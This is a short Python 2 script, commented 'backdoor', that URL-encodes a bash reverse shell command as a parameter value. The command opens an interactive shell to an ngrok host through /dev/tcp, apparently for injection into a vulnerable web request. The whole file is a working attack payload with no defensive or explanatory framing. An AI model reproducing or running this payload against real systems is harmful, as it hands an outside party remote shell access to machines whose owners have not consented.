#!/usr/bin/python
from urllib import urlencode
# backdoor
data = {
        '#': "bash -c 'bash -i >& /dev/tcp/0.tcp.ngrok.io/13226 0>&1'"
}
print urlencode(data)
